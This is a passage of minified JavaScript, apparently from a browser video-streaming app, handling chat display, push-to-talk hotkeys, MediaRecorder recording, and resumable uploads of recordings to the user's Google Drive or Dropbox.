if("recv"==msgTransferList[i].type||"action"==msgTransferList[i].type){label="";msgTransferList[i].label&&(label=msgTransferList[i].label),msg.innerHTML=label+msgTransferList[i].msg+"<i><small><small>"+time+"</small></small></i>",msg.classList.add("inMessage")}else"alert"==msgTransferList[i].type?(msg.innerHTML=msgTransferList[i].msg+"<i><small><small>"+time+"</small></small></i>",msg.classList.add("inMessage")):(msg.innerHTML=msgTransferList[i].msg,msg.classList.add("outMessage"));msg.id&&document.getElementById(msg.id)?document.getElementById(msg.id).innerHTML=msg.innerHTML:getById("chatBody").appendChild(msg)}chatUpdateTimeout&&clearInterval(chatUpdateTimeout),document.getElementById("chatBody").scrollTop=document.getElementById("chatBody").scrollHeight,chatUpdateTimeout=setTimeout((function(){updateMessages()}),6e4)}}function EnterButtonChat(event){13===(event.which||event.keyCode)&&(event.preventDefault(),sendChatMessage())}function showCustomizer(arg,ele){getById("showCustomizerButton1").style.backgroundColor="",getById("showCustomizerButton2").style.backgroundColor="",getById("showCustomizerButton3").style.backgroundColor="",getById("showCustomizerButton4").style.backgroundColor="",getById("showCustomizerButton1").style.boxShadow="",getById("showCustomizerButton2").style.boxShadow="",getById("showCustomizerButton3").style.boxShadow="",getById("showCustomizerButton4").style.boxShadow="","none"!=getById("customizeLinks"+arg).style.display?(getById("customizeLinks").style.display="none",getById("customizeLinks"+arg).style.display="none"):(getById("showCustomizerButton"+arg).style.backgroundColor="#1e0000",getById("showCustomizerButton"+arg).style.boxShadow="inset 0px 0px 1px #b90000",getById("customizeLinks1").style.display="none",getById("customizeLinks3").style.display="none",getById("customizeLinks").style.display="block",getById("customizeLinks"+arg).style.display="block")}function setPTTvalue(){var key="";PPTHotkey.ctrl&&(key+="Control"),PPTHotkey.meta&&(key&&(key+=" + "),key+="Meta"),PPTHotkey.alt&&(key&&(key+=" + "),key+="Alt"),"Control"==PPTHotkey.key||"Alt"==PPTHotkey.key||"Meta"==PPTHotkey.key||(!1!==PPTHotkey.key?(key&&(key+=" + ")," "===PPTHotkey.key?key+="Space":key+=PPTHotkey.key):key&&navigator.userAgent.toLowerCase().indexOf(" electron/")>-1&&(getById("pptHotKey").title="Note: Global hot-keys can't simply be Control, Alt, or Meta keys.")),getById("pptHotKey").value=key;try{window.electronApi&&window.electronApi.updatePPT?window.electronApi.updatePPT(PPTHotkey):navigator.userAgent.toLowerCase().indexOf(" electron/")>-1&&(ipcRenderer||(ipcRenderer=require("electron").ipcRenderer),ipcRenderer&&ipcRenderer.send("PPTHotkey",PPTHotkey))}catch(e){errorlog(e)}}var PPTHotkey=getStorage("PPTHotkey")||!1;function setHotKeyAuto(hotkeyInput){PPTHotkey={ctrl:!1,alt:!1,meta:!1,key:!1};var key="";if(hotkeyInput){const modifiers=hotkeyInput.replaceAll(" ","+").split("+");modifiers.forEach((modifier=>{const trimmedModifier=modifier.trim().toLowerCase();"control"===trimmedModifier||"ctrl"===trimmedModifier?(PPTHotkey.ctrl=!0,key+="Control"):"alt"===trimmedModifier?(PPTHotkey.alt=!0,key+="Alt"):"meta"===trimmedModifier&&(PPTHotkey.meta=!0,key+="Meta")}));var lastKey=modifiers.pop().trim();PPTHotkey.key=lastKey,(lastKey||" "===lastKey||0===lastKey)&&(key&&(key+=" + "),key+=" "===lastKey?"Space":lastKey)}else PPTHotkey.ctrl=!0,PPTHotkey.key="m",PPTHotkey.meta=!0,key="Control + Alt + m";setStorage("PPTHotkey",PPTHotkey,99999),getById("pptHotKey").value=key;try{window.electronApi&&window.electronApi.updatePPT?window.electronApi.updatePPT(PPTHotkey):navigator.userAgent.toLowerCase().indexOf(" electron/")>-1&&(ipcRenderer||(ipcRenderer=require("electron").ipcRenderer),ipcRenderer&&ipcRenderer.send("PPTHotkey",PPTHotkey))}catch(e){errorlog(e)}}function setHotKey(keyinput=!0){if(keyinput){PPTHotkey={ctrl:!1,alt:!1,meta:!1,key:!1},log(event);var key="";event.ctrlKey&&(key+="Control",PPTHotkey.ctrl=!0),event.metaKey&&(key&&(key+=" + "),key+="Meta",PPTHotkey.meta=!0),event.altKey&&(key&&(key+=" + "),key+="Alt",PPTHotkey.alt=!0),"Control"==event.key||"Alt"==event.key||"Meta"==event.key||(event.key||" "===event.key||0===event.key)&&(key&&(key+=" + ")," "===event.key?key+="Space":key+=event.key,PPTHotkey.key=event.key),setStorage("PPTHotkey",PPTHotkey,99999),event.target.value=key;try{window.electronApi&&window.electronApi.updatePPT?window.electronApi.updatePPT(PPTHotkey):navigator.userAgent.toLowerCase().indexOf(" electron/")>-1&&(ipcRenderer||(ipcRenderer=require("electron").ipcRenderer),ipcRenderer&&ipcRenderer.send("PPTHotkey",PPTHotkey))}catch(e){errorlog(e)}return getById("pptHotKey").value=event.target.value,getById("pptHotKey0").value=event.target.value,event.preventDefault(),event.stopPropagation(),!1}getById("pptHotKey").value="",getById("pptHotKey0").value="",PPTHotkey=!1,removeStorage("PPTHotkey");try{window.electronApi&&window.electronApi.updatePPT?window.electronApi.updatePPT(PPTHotkey):navigator.userAgent.toLowerCase().indexOf(" electron/")>-1&&(ipcRenderer||(ipcRenderer=require("electron").ipcRenderer),ipcRenderer&&ipcRenderer.send("PPTHotkey",PPTHotkey))}catch(e){errorlog(e)}}function setupGoogleDriveUploader(filename=!1,sessionUri=!1){session.gdrive||(session.gdrive={},session.gdrive.accessToken=!1);var tokenClient,gdrive={},gapiClient=!1,uploading=!1,tokenClientGood=!1,tokenChain={};const CLIENT_ID="877147493034-67tq62ds8cj54it6cr0ut24irm7t7q5g.apps.googleusercontent.com",API_KEY="AIzaSyAcboxS2N-39sfn1xn9jNCebvKkuHAdlNk",DISCOVERY_DOC="https://www.googleapis.com/discovery/v1/apis/drive/v3/rest",SCOPES="https://www.googleapis.com/auth/drive.file";var res,rej,totalChunksRecorded=0,totalChunksUploaded=0,currentByte=0,chunks=new Blob([]),finalized=!1;(gdrive.promise=!1,gdrive.sessionUri=sessionUri,filename||sessionUri)||(gdrive.promise=new Promise(((resolve,reject)=>{res=resolve,rej=reject})),gdrive.promise.resolve=res,gdrive.promise.reject=rej);async function initializeGapiClient(){console.log("initializeGapiClient"),await gapi.client.init({apiKey:API_KEY,discoveryDocs:[DISCOVERY_DOC]}),tokenClient?(tokenClient.requestAccessToken({prompt:gapi.client.getToken()?"":"consent"}),tokenClientGood?(session.gdrive.accessToken=gapi.auth.getToken().access_token,filename?(gdrive.sessionUri=await gdrive.startResumableUpload(filename),console.log(gdrive.sessionUri),uploadLoop()):gdrive.promise&&gdrive.promise.resolve&&gdrive.promise.resolve()):gapiClient=!0):gapiClient=!0}function onTokenError(response){console.log("onTokenError"),gdrive.promise.reject&&gdrive.promise.reject()}async function onTokenResponse(response){console.log("onTokenResponse"),"popup_closed_by_user"===response.error||"access_denied"===response.error?(errorlog("User cancelled the sign-in process."),gdrive.promise.reject&&gdrive.promise.reject()):void 0!==response.error?gdrive.promise.reject&&gdrive.promise.reject():gapiClient?(tokenClient.requestAccessToken({prompt:gapi.client.getToken()?"":"consent"}),tokenChain=gapi.auth.getToken(),session.gdrive.accessToken=tokenChain.access_token,filename?(gdrive.sessionUri=await gdrive.startResumableUpload(filename),console.log(gdrive.sessionUri),uploadLoop()):gdrive.promise&&gdrive.promise.resolve&&gdrive.promise.resolve()):tokenClientGood=!0}async function uploadLoop(){if(!uploading&&gdrive.sessionUri){for(uploading=!0;chunks&&(finalized||chunks.size>262144);){if(finalized){var chunk=chunks.slice(0,chunks.size);let res=await finalizeUpload(chunk);return void log(res)}var chunkSize=262144*Math.floor(chunks.size/262144);chunk=chunks.slice(0,chunkSize);chunks=chunks.slice(chunkSize),currentByte=await uploadChunk(chunk)}uploading=!1}}async function uploadChunk(chunk){const endByte=currentByte+chunk.size-1;totalChunksUploaded+=chunk.size;const headers=new Headers({"Content-Range":`bytes ${currentByte}-${endByte}/*`}),response=await fetch(gdrive.sessionUri,{method:"PUT",headers:headers,body:chunk});if(!response.ok&&308!==response.status)throw new Error(`Failed to upload chunk: ${response.statusText}`);return updateProgressBar(),endByte+1}async function finalizeUpload(chunk){const endByte=currentByte+chunk.size-1,headers=new Headers({"Content-Range":`bytes ${currentByte}-${endByte}/${endByte+1}`}),response=await fetch(gdrive.sessionUri,{method:"PUT",headers:headers,body:chunk});return chunk&&(totalChunksUploaded+=chunk.size),updateProgressBar(2),response.json()}function updateProgressBar(state=0){if(2==state){setTimeout((function(){"100%"==getById("progressBar").style.width&&getById("progressContainer").classList.add("hidden")}),1e3),getById("progressBar").style.width="100%",(msg={}).gdrive={up:parseInt(totalChunksUploaded/1024),rec:parseInt(totalChunksUploaded/1024),state:state};for(var i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID)}else if(totalChunksRecorded>0){var msg,progressPercentage=totalChunksUploaded/(totalChunksRecorded||1)*100,bytesLeft=parseInt((totalChunksRecorded-totalChunksUploaded)/1024);getById("progressBar").style.width=progressPercentage+"%",getById("progressBar").innerHTML="Upload progress to Google Drive: "+progressPercentage.toFixed(2)+"%, with "+convertKilobytes(bytesLeft)+" left",(msg={}).gdrive={up:parseInt(totalChunksUploaded/1024),rec:parseInt(totalChunksRecorded/1024),state:state};for(i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendMessage(msg,msg.UUID)}}return gdrive.startResumableUpload=async function(fname,retry=!0){console.log("startResumableUpload",retry);const fileMetadata={name:fname},metadata=new Blob([JSON.stringify(fileMetadata)],{type:"application/json"});try{var response=await fetch("https://www.googleapis.com/upload/drive/v3/files?uploadType=resumable",{method:"POST",headers:{Authorization:"Bearer "+session.gdrive.accessToken,"Content-Type":"application/json; charset=UTF-8"},body:metadata});if(!response.ok)throw new Error("Start resumable upload failed: "+response.statusText);return response.headers.get("Location")}catch(err){errorlog(err);try{var res,rej;if(retry)return session.gdrive.accessToken=!1,gdrive.promise=new Promise(((resolve,reject)=>{res=resolve,rej=reject})),gdrive.promise.resolve=res,gdrive.promise.reject=rej,filename=!1,tokenClient.requestAccessToken({prompt:gapi.client.getToken()?"":"consent"}),await gdrive.promise,!!session.gdrive.accessToken&&await gdrive.startResumableUpload(fname,!1)}catch(err2){return errorlog(err2),!1}}},gdrive.sessionUri||(loadScript("https://apis.google.com/js/api.js",(function(){log("Google API loaded"),function gapiLoaded(){console.log("gapiLoaded"),gapi.load("client",initializeGapiClient)}()})),loadScript("https://accounts.google.com/gsi/client",(function(){log("Google Identity Services loaded"),async function gisLoaded(){console.log("gisLoaded"),tokenClient=google.accounts.oauth2.initTokenClient({client_id:CLIENT_ID,scope:SCOPES,callback:onTokenResponse,error_callback:onTokenError})}()}))),gdrive.addChunk=function(chunk){chunk&&chunks?(totalChunksRecorded+=chunk.size,chunks=new Blob([chunks,chunk],{type:chunk.type}),session.cleanOutput||getById("progressContainer").classList.remove("hidden"),updateProgressBar()):!1===chunk&&(finalized=!0),uploadLoop()},gdrive}function convertKilobytes(kilobytes){return kilobytes>=1048576?Math.ceil(kilobytes/1048576).toFixed(0)+" GB":kilobytes>=1024?Math.ceil(kilobytes/1024).toFixed(0)+" MB":kilobytes+"KB"}function resumeDropbox(){var sessionData=localStorage.getItem("dropboxSession");sessionData&&(sessionData=JSON.parse(sessionData)).forEach((main=>{session.dbx.filesUploadSessionFinish({cursor:{session_id:main.result.session_id,offset:main.vdo.offset},commit:{path:"/"+main.vdo.filename}}).then((function(response){console.log(response),console.log("File uploaded to Dropbox:",response.result.path_display),DBXqueue=[]})).catch((function(error){localStorage.removeItem("dropboxSession"),console.error("Error uploading file:",error),session.cleanOutput||confirmAlt("There was an error finalizing a previous file upload. \n"+(error.error_summary||"")+"\n\nWould you like to keep trying?").then((res=>{res||localStorage.removeItem("dropboxSession")}))}))}))}async function streamVideoToDropbox(filename){if(session.dbx)return await session.dbx.filesUploadSessionStart({close:!1}).then((function(main){var sessionId=main.result.session_id,offset=0,chunkCounter=0,DBXqueue=[],uploadActive=!1;log(main),main.vdo={},main.vdo.filename=filename,main.vdo.offset=offset;var sessionData=localStorage.getItem("dropboxSession");if(sessionData){try{sessionData=JSON.parse(sessionData)}catch(e){errorlog(e),sessionData=[]}sessionData.push(main)}else sessionData=[main];if(localStorage.setItem("dropboxSession",JSON.stringify(sessionData)),session.directorUUID)for(var msg={dropbox:-1},i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendPeers(msg,msg.UUID);var totalChunksRecorded=0,totalChunksUploaded=0;function finishedChunksUploaded(){try{getById("progressBar").style.width="100%",setTimeout((function(){"100%"==getById("progressBar").style.width&&getById("progressContainer").classList.add("hidden")}),1e3)}catch(e){errorlog(e)}}function updateProgressBar(){if(totalChunksRecorded>0){var progressPercentage=totalChunksUploaded/(totalChunksRecorded||1)*100;getById("progressBar").style.width=progressPercentage+"%",getById("progressBar").innerHTML="Upload progress to Dropbox: "+progressPercentage.toFixed(2)+"%"}}return async function uploadChunk(chunk,oldCursor=!1){if(sessionId){if(DBXqueue.length&&!1===DBXqueue[DBXqueue.length-1])console.log("CHUNKS COMPLETED: "+chunkCounter+"/"+(chunkCounter+(DBXqueue.length-1)));else if(DBXqueue.push(chunk),function updateTotalChunksRecorded(){session.cleanOutput||getById("progressContainer").classList.remove("hidden"),totalChunksRecorded++,updateProgressBar()}(),console.log("CHUNKS COMPLETED:"+chunkCounter+"/"+(chunkCounter+DBXqueue.length)),console.log(DBXqueue),!(DBXqueue.length>1)){if(session.directorUUID){var msg={};msg.dropbox=DBXqueue.length;for(var i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendPeers(msg,msg.UUID)}if(!1===chunk)console.log("CHUNKS COMPLETED UPLOADING.. closing dropbox file: "+offset+" "+filename),console.log({session_id:sessionId,offset:offset}),session.dbx.filesUploadSessionFinish({cursor:{session_id:sessionId,offset:offset},commit:{path:"/"+filename}}).then((function(response){DBXqueue=[];try{console.log("File uploaded to Dropbox:",response.result.path_display)}catch(e){errorlog(e)}var sessionData=localStorage.getItem("dropboxSession");if(sessionData)try{sessionData=(sessionData=JSON.parse(sessionData)).filter((entry=>entry.vdo.filename!==filename&&entry.vdo&&entry.vdo.filename))}catch(e){errorlog(sessionData),errorlog(e),sessionData=[]}else sessionData=[];if(sessionData.length?localStorage.setItem("dropboxSession",JSON.stringify(sessionData)):localStorage.removeItem("dropboxSession"),sessionId=!1,session.directorUUID){var msg={};msg.dropbox=DBXqueue.length;for(var i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendPeers(msg,msg.UUID)}finishedChunksUploaded()})).catch((function(e){errorlog(e),e.error_summary&&(session.cleanOutput||warnUser("Error\n\n"+error_summary))}));else if(!uploadActive){for(uploadActive=!0;DBXqueue.length;)try{if(!sessionId)return void errorlog("WHY IS THIS NOT STOPPED ?");let cursor={session_id:sessionId,offset:offset};!1===DBXqueue[0]?(console.log("CHUNKS COMPLETED UPLOADING... closing dropbox file: "+offset),await session.dbx.filesUploadSessionFinish({cursor:{session_id:sessionId,offset:offset},commit:{path:"/"+filename}}).then((function(response){DBXqueue=[];try{console.log("File uploaded to Dropbox:",response.result.path_display)}catch(e){errorlog(e)}var sessionData=localStorage.getItem("dropboxSession");if(sessionData)try{sessionData=(sessionData=JSON.parse(sessionData)).filter((entry=>entry.vdo.filename!==filename&&entry.vdo&&entry.vdo.filename))}catch(e){errorlog(sessionData),errorlog(e),sessionData=[]}else sessionData=[];if(sessionData.length?localStorage.setItem("dropboxSession",JSON.stringify(sessionData)):localStorage.removeItem("dropboxSession"),sessionId=!1,session.directorUUID){var msg={};msg.dropbox=DBXqueue.length;for(var i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendPeers(msg,msg.UUID)}finishedChunksUploaded()})).catch((function(e){errorlog(e),e.error_summary&&(session.cleanOutput||warnUser("Error\n\n"+error_summary))}))):await session.dbx.filesUploadSessionAppendV2({cursor:cursor,close:!1,contents:DBXqueue[0]}).then((function(){offset+=DBXqueue[0].size,main.vdo.offset=offset;var sessionData=localStorage.getItem("dropboxSession");if(sessionData)try{(sessionData=(sessionData=JSON.parse(sessionData)).filter((entry=>entry.vdo.filename!==filename&&entry.vdo&&entry.vdo.filename))).push(main)}catch(e){errorlog(sessionData),errorlog(e),sessionData=[main]}else sessionData=[main];if(localStorage.setItem("dropboxSession",JSON.stringify(sessionData)),DBXqueue.shift(),totalChunksUploaded++,updateProgressBar(),chunkCounter+=1,console.log("CHUNKs COMPLETED:"+chunkCounter+"/"+(chunkCounter+DBXqueue.length)),session.directorUUID){var msg={};msg.dropbox=DBXqueue.length;for(var i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendPeers(msg,msg.UUID)}})).catch((function(e){errorlog(e),e.error_summary&&(session.cleanOutput||warnUser("Error\n\n"+error_summary))}))}catch(e){errorlog(e);break}uploadActive=!1}}}else errorlog("WHY IS THIS NOT STOPPED?")}})).catch((function(e){errorlog(e),session.cleanOutput||warnUser("Dropbox failed to initialize.\n\nAre you credentials valid? Tokens may expire after a few hours.",8e3)}));if(session.directorUUID)for(var msg={dropbox:-2},i=0;i<session.directorList.length;i++)msg.UUID=session.directorList[i],session.sendPeers(msg,msg.UUID)}PPTHotkey&&setPTTvalue();var recordingBitratePromise=!1,defaultRecordingBitrate=!1;async function recordVideo(target,event=null,videoKbps=!1){!1===session.record&&warnlog("recordings are disabled by decree of thy host magistrate");var UUID=target.dataset.UUID;if(!UUID)return;var video=session.rpcs[UUID].videoElement;if(!video)return;if(video.stopWriter)return video.stopWriter(),void updateLocalRecordButton(UUID,-1);if(video.startWriter)return await video.startWriter(),void updateLocalRecordButton(UUID,0);var elements,audioKbps=!1;if(null===event){if(null===defaultRecordingBitrate)return void updateLocalRecordButton(UUID,-1)}else{if(event.ctrlKey||event.metaKey)return updateLocalRecordButton(UUID,-3),Callbacks.push([recordVideo,target,null,!1]),log("Record Video queued"),defaultRecordingBitrate=!1,void(recordingBitratePromise=!1);defaultRecordingBitrate=!1,recordingBitratePromise=!1}if(log("Record Video Clicked"),"recording"in video)return log("ALREADY RECORDING!"),updateLocalRecordButton(UUID,-2),video.recorder.stop(),session.requestRateLimit(35,UUID),!1===session.audiobitrate&&session.requestAudioRateLimit(-1,UUID),(elements=document.querySelectorAll('[data-action-type="change-quality2"][data--u-u-i-d="'+UUID+'"]'))[0]&&(elements[0].classList.add("pressed"),elements[0].ariaPressed="true"),(elements=document.querySelectorAll('[data-action-type="change-quality1"][data--u-u-i-d="'+UUID+'"]'))[0]&&(elements[0].classList.remove("pressed"),elements[0].ariaPressed="false"),void((elements=document.querySelectorAll('[data-action-type="change-quality3"][data--u-u-i-d="'+UUID+'"]'))[0]&&(elements[0].classList.remove("pressed"),elements[0].ariaPressed="false"));if(updateLocalRecordButton(UUID,0),video.recording=!0,video.recorder={},!1===videoKbps)if(0==defaultRecordingBitrate){if(videoKbps=4e3,!1!==session.recordLocal&&(videoKbps=session.recordLocal),recordingBitratePromise||(window.focus(),recordingBitratePromise=promptAlt(getTranslation("press-ok-to-record"),!1,!1,videoKbps)),videoKbps=await recordingBitratePromise,log("videoKbps: "+videoKbps+", UUID:"+UUID),null===videoKbps)return updateLocalRecordButton(UUID,-1),target.style.backgroundColor="",delete video.recorder,delete video.recording,void(defaultRecordingBitrate=null);videoKbps=parseInt(videoKbps),defaultRecordingBitrate=videoKbps}else videoKbps=defaultRecordingBitrate;videoKbps<=0?(audioKbps=-1*videoKbps,videoKbps=!1,!1===session.audiobitrate&&(audioKbps>0&&audioKbps>=128?session.requestAudioRateLimit(128,UUID):0==audioKbps?session.requestAudioRateLimit(session.audiobitratePRO,UUID):session.requestAudioRateLimit(parseInt(audioKbps),UUID))):videoKbps<50?(videoKbps=50,session.requestRateLimit(parseInt(.8*videoKbps),UUID)):(session.requestRateLimit(parseInt(.8*videoKbps),UUID),videoKbps>4e3?!1===session.audiobitrate&&(session.pcm?session.requestAudioRateLimit(session.audiobitratePRO,UUID):session.requestAudioRateLimit(128,UUID)):videoKbps>2500&&!1===session.audiobitrate&&(session.pcm?session.requestAudioRateLimit(session.audiobitratePRO,UUID):session.requestAudioRateLimit(80,UUID)));var timestamp=Date.now(),filename="";(session.rpcs[UUID].label||session.rpcs[UUID].streamID)&&(filename=(filename=(filename=session.rpcs[UUID].label||session.rpcs[UUID].streamID).replace(/[\W]+/g,"_")).substring(0,200)),filename+="_"+timestamp.toString();if(void 0===video.srcObject||!video.srcObject)return;video.recorder.stop=function(restart=!1,notify=!1){if(session.dbx&&video.dropbox&&video.dropbox[filename]&&video.dropbox[filename](!1),video.gdrive&&video.gdrive[filename]&&video.gdrive[filename].addChunk(!1),!video.recording)return errorlog("ALREADY STOPPED"),void updateLocalRecordButton(UUID,-1);notify&&(session.cleanOutput||warnUser("A local recording has stopped unexpectedly."),session.beepToNotify&&playtone(),target.classList.remove("shake"),setTimeout((function(target){target.classList.add("shake")}),10,target)),video.recording=!1,updateLocalRecordButton(UUID,-2);try{video.recorder&&video.recorder.mediaRecorder&&video.recorder.mediaRecorder.stop&&"inactive"!==video.recorder.mediaRecorder.state&&video.recorder.mediaRecorder.stop()}catch(e){errorlog(e);try{video.recorder.mediaRecorder.stop()}catch(e1){errorlog(e1)}}var elements;session.requestRateLimit(35,UUID),!1===session.audiobitrate&&session.requestAudioRateLimit(-1,UUID),(elements=document.querySelectorAll('[data-action-type="change-quality2"][data--u-u-i-d="'+UUID+'"]'))[0]&&(elements[0].classList.add("pressed"),elements[0].ariaPressed="true"),(elements=document.querySelectorAll('[data-action-type="change-quality1"][data--u-u-i-d="'+UUID+'"]'))[0]&&(elements[0].classList.remove("pressed"),elements[0].ariaPressed="false"),(elements=document.querySelectorAll('[data-action-type="change-quality3"][data--u-u-i-d="'+UUID+'"]'))[0]&&(elements[0].classList.remove("pressed"),elements[0].ariaPressed="false"),!0,setTimeout(((writer1,UUID1,video1)=>{try{writer1.close()}catch(e){}updateLocalRecordButton(UUID1,-1),delete video1.recorder,delete video1.recording}),1200,video.recorder.writer,UUID,video)};const{readable:readable,writable:writable}=new TransformStream({transform:(chunk,ctrl)=>chunk.arrayBuffer().then((b=>ctrl.enqueue(new Uint8Array(b))))});var filext=".webm";let options={};if(videoKbps){var tryCodec=session.recordingVideoCodec||"";if(tryCodec&&MediaRecorder.isTypeSupported("video/webm;codecs="+tryCodec)){if(session.cleanOutput||console.log("ğŸ‘ The browser 'says' it supports "+tryCodec),options.mimeType="video/webm;codecs="+tryCodec,session.pcm){var mimeTypeWithPCM="video/webm;codecs="+tryCodec+",pcm";MediaRecorder.isTypeSupported(mimeTypeWithPCM)?options.mimeType=mimeTypeWithPCM:options.mimeType="video/webm;codecs=pcm"}}else tryCodec&&warnlog("video/webm;codecs="+tryCodec+" - is not supported"),options.mimeType=session.pcm&&MediaRecorder.isTypeSupported("video/webm;codecs=pcm")?"video/webm;codecs=pcm":"video/webm";options.videoBitsPerSecond=parseInt(1024*videoKbps),videoKbps<1e3?options.audioBitsPerSecond=parseInt(102400):videoKbps<6e3?options.audioBitsPerSecond=parseInt(133120):videoKbps<2e4?options.audioBitsPerSecond=parseInt(262144):options.bitsPerSecond=parseInt(1024*videoKbps),iOS&&options.mimeType&&(MediaRecorder.isTypeSupported(options.mimeType)||(options.mimeType="video/mp4",filext=".mp4")),video.recorder.mediaRecorder=new MediaRecorder(video.srcObject,options)}else{options.mimeType="audio/webm",0==audioKbps?MediaRecorder.isTypeSupported("audio/webm;codecs=pcm")&&(options.mimeType="audio/webm;codecs=pcm"):options.bitsPerSecond=parseInt(1024*audioKbps);var stream=createMediaStream();video.srcObject.getAudioTracks().forEach((track=>{stream.addTrack(track,video.srcObject)})),iOS&&options.mimeType&&(MediaRecorder.isTypeSupported(options.mimeType)||(options.mimeType="video/mp4",filext=".mp4")),video.recorder.mediaRecorder=new MediaRecorder(stream,options)}var writer=writable.getWriter();readable.pipeTo(streamSaver.createWriteStream(filename.toString()+filext,video.recorder.stop)),video.recorder.writer=writer,pokeIframeAPI("recording-started"),log(options),video.recorder.mediaRecorder.ondataavailable=function handleDataAvailable(event){if(event.data&&event.data.size>0){try{writer.write(event.data),video.recording&&updateLocalRecordButton(UUID,parseInt((Date.now()-timestamp)/1e3)||0)}catch(e){warnlog("Stream recording error or ended")}try{session.dbx&&video.dropbox&&video.dropbox[filename]&&video.dropbox[filename](event.data),video.gdrive&&video.gdrive[filename]&&video.gdrive[filename].addChunk(event.data)}catch(e){errorlog(e)}}},video.recorder.mediaRecorder.onerror=function(event){errorlog(event),video.recorder.stop(),session.requestRateLimit(35,UUID),session.cleanOutput||setTimeout((function(){warnUser("an error occured with the media recorder; stopping recording")}),1)},video.recorder.mediaRecorder.onstop=function(event){log("mediaRecorder stopped")},video.srcObject.onended=function(event){video.recorder.stop(),session.cleanOutput||setTimeout((function(){warnUser("stream ended! stopping recording")}),1)},setTimeout((function(v){v.recorder.mediaRecorder.start(1e3)}),500,video)}function updateGdriveButton(UUID,gdrive,screen=!1){if(screen)var elements=document.querySelectorAll('[data-action-type="recorder-google-drive-remote"][data--u-u-i-d="'+UUID+'_screen"]');else elements=document.querySelectorAll('[data-action-type="recorder-google-drive-remote"][data--u-u-i-d="'+UUID+'"]');if(elements[0]){var progressPercentage=parseInt(1e3*gdrive.up/gdrive.rec)/10;elements[0].innerText=progressPercentage+"%",gdrive.state&&2==gdrive.state?elements[0].innerText="GDrive "+elements[0].innerText+" (done)":elements[0].innerText+=", "+convertKilobytes(gdrive.rec)+" left"}}function updateRemoteRecordButton(UUID,recorder,screen=!1){if(screen)var elements=document.querySelectorAll('[data-action-type="recorder-remote"][data--u-u-i-d="'+UUID+'_screen"]');else elements=document.querySelectorAll('[data-action-type="recorder-remote"][data--u-u-i-d="'+UUID+'"]');if(elements[0]){var time=parseInt(recorder)||0;if(-4==time)session.cleanOutput||warnUser("A remote recording has stopped unexpectedly.\n\nDid a user cancel the file downlaod?"),session.beepToNotify&&playtone(),elements[0].classList.add("pressed"),elements[0].ariaPressed="true",elements[0].classList.remove("shake"),elements[0].innerHTML='<i class="las la-stop-circle"></i> stopping...',setTimeout((function(ele){ele.classList.add("shake")}),10,elements[0]);else if(-3==time)elements[0].classList.remove("pressed"),elements[0].ariaPressed="false",elements[0].disabled=!0,elements[0].innerHTML='<i class="lab la-apple"></i> Not Supported',session.cleanOutput||setTimeout((function(){warnUser("The remote browser does not support recording.\n\nPerhaps try local recording instead.")}),0);else if(-5==time)session.cleanOutput||setTimeout((function(){warnUser("The remote browser has only experimental support for media recording.\n\nAlso, when this download stops, the remote user may be asked to download the file for it to save.")}),0);else if(-2==time)elements[0].classList.add("pressed"),elements[0].ariaPressed="true",elements[0].innerHTML='<i class="las la-stop-circle"></i> stopping...';else if(-1==time)elements[0].classList.remove("pressed"),elements[0].ariaPressed="false",elements[0].innerHTML='<i class="las la-circle"></i> <span data-translate="record-remote"> Record Remote</span>';else{var minutes=Math.floor(time/60),seconds=time-60*minutes;elements[0].classList.add("pressed"),elements[0].ariaPressed="true",elements[0].innerHTML='<i class="las la-stop-circle"></i> '+minutes+"m : "+zpadTime(seconds)+"s"}}}function updateLocalRecordButton(UUID,recorder){var elements=document.querySelectorAll('[data-action-type="recorder-local"][data--u-u-i-d="'+UUID+'"]');if(elements[0]){var time=parseInt(recorder)||0;if(-3==time)elements[0].classList.add("pressed"),elements[0].ariaPressed="true",elements[0].innerHTML='<i class="las la-check"></i> <span data-translate="record"> ARMED</span>',elements[0].style.backgroundColor="#BF3F3F";else if(-2==time)elements[0].classList.add("pressed"),elements[0].ariaPressed="true",elements[0].innerHTML='<i class="las la-stop-circle"></i> stopping...',elements[0].style.backgroundColor="";else if(-1==time)elements[0].classList.remove("pressed"),elements[0].ariaPressed="false",elements[0].innerHTML='<i class="las la-circle"></i> <span data-translate="record-local"> Record Local</span>',elements[0].style.backgroundColor="";else{var minutes=Math.floor(time/60),seconds=time-60*minutes;elements[0].classList.add("pressed"),elements[0].ariaPressed="true",elements[0].innerHTML='<i class="las la-stop-circle"></i> '+minutes+"m : "+zpadTime(seconds)+"s",elements[0].style.backgroundColor=""}}}async function recordLocalVideoToggle(){if(session.videoElement){log("recordLocalVideoToggle()");var ele=getById("recordLocalbutton");if("0"==ele.dataset.state){if(session.videoElement.recorder&&session.videoElement.recorder.closing)return warnlog("already closing"),getById("recordLocalbutton").classList.remove("shake"),getById("recordLocalbutton").classList.add("shake"),setTimeout((function(){getById("recordLocalbutton").classList.remove("shake")}),1e3),!1;if(ele.dataset.state="1",ele.style.backgroundColor="red",ele.innerHTML='<i class="toggleSize las la-square" ></i>',"recording"in session.videoElement)errorlog("its already recording ??");else{var res=await recordLocalVideo("start");log(res)}var elements;if(session.director)(elements=document.querySelectorAll('[data-action-type="recorder-local"][data-sid="'+session.streamID+'"]'))[0]&&(elements[0].classList.add("pressed"),elements[0].ariaPressed="true",elements[0].innerHTML='<i class="las la-stop-circle"></i><span data-translate="record-local"> Record</span>');return!0}if("recording"in session.videoElement){res=await recordLocalVideo("stop");log(res)}return ele.dataset.state="0",ele.style.backgroundColor="",ele.innerHTML='<i class="toggleSize las la-dot-circle" ></i>',session.director&&(elements=document.querySelectorAll('[data-action-type="recorder-local"][data-sid="'+session.streamID+'"]'))[0]&&(elements[0].classList.remove("pressed"),elements[0].ariaPressed="false",elements[0].innerHTML='<i class="las la-circle"></i><span data-translate="record-local"> Record</span>'),!1}}function cleanupSensorData(data){for(const key in data){let nonNullFound=!1;for(const subKey in data[key])null===data[key][subKey]?delete data[key][subKey]:"t"!==subKey&&(nonNullFound=!0);nonNullFound||delete data[key]}}function setupSensorData(pollrate=30){session.sensors={},session.sensors.data={};const 